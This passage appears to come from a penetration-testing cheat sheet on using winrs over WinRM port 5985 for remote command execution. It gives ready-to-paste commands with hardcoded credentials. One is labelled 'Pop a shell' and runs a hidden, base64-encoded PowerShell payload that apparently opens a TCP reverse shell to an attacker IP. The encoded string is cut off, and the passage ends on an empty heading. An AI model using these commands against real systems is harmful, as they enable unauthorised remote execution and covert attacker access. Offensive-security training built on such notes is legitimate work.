
### winrs (WinRM - 5985)

Allows us to execute commands remotely

```bash
# Execute commands
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"

# Pop a shell (cradle with ps_cradle_gen.sh)
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```


## Trick for enabling winrs


